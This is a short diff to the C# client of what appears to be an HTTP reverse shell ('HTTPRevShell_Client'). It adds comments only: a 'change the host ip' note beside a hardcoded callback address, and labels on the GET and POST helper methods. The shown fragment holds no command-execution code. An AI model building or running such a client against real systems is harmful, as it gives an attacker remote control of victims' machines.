@@ -13,7 +13,7 @@ namespace HTTPRevShell_Client
     {
         static void Main(string[] args)
         {
-            string host = "10.200.32.131";
+            string host = "10.200.32.131"; // change the host ip
             string url = String.Concat("http://",host,"/");
 
             while(true)
@@ -40,6 +40,7 @@ namespace HTTPRevShell_Client
 
         }
 
+        // HTTP Get Request Method
         public static string Get(string uri)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
@@ -53,6 +54,7 @@ namespace HTTPRevShell_Client
             }
         }
 
+        // HTTP Post Request Method
         public static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
         {
             byte[] dataBytes = Encoding.UTF8.GetBytes(data);
